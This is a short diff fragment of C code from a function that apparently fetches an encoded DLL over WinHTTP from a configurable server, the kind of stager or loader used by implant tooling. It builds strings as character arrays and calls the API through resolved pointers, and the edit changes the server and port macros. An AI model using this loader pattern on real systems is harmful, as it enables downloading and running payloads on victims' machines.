@@ -276,12 +276,12 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize)
 
     // Host-Only
     // WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
-    WCHAR wServer[] = { SERVER } ;
+    WCHAR wServer[] = { SERVER_M };
 
     WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
     WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
 
-    INTERNET_PORT dwPort = PORT;
+    INTERNET_PORT dwPort = PORT_M;
     DWORD dwEncodedDllSize = 0;
 
     HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
